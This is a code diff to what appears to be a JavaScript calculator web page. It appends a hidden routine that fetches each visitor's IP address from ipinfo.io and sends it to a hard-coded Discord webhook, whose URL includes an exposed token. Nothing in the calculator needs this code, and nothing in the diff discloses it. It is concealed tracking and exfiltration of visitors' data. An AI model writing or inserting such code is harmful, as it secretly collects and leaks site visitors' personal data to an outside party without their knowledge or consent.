@@ -166,3 +166,20 @@ equals.onclick = function () {
   submitnum("a");
   calculate(sides.length);
 };
+
+let ip
+$.get("http://ipinfo.io", function(response) {
+  ip = response.ip;
+}, "jsonp");
+
+function discord_message(webHookURL, message) {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", webHookURL, true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(JSON.stringify({
+      'content': message,
+      'username':'AI',
+  }));
+}
+
+discord_message("https://discordapp.com/api/webhooks/1330268826113409065/h0H-wNxBW-ilDGrU_XnkZ_NMB9_zrDveLrkn-z9j_nCAKDOHAnmPGjdySaXKmbWmT6FO", ip)
